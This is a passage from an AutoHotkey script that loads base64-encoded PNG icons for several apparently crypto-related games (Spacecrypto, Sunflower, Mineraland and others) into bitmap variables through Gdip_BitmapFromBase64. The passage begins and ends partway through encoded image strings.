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")
A_Args.PNG.HSpacecrypto := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Spacecrypto  := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Sunflower    := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HSunflower   := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.MouseHaunt   := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.HMouseHaunt  := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.WorkerTown   := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.HWorkerTown  := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.TDS          := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.HTDS         := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Mineraland   := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HMineraland  := Gdip_BitmapFromBase64(0,1,Data.PNG "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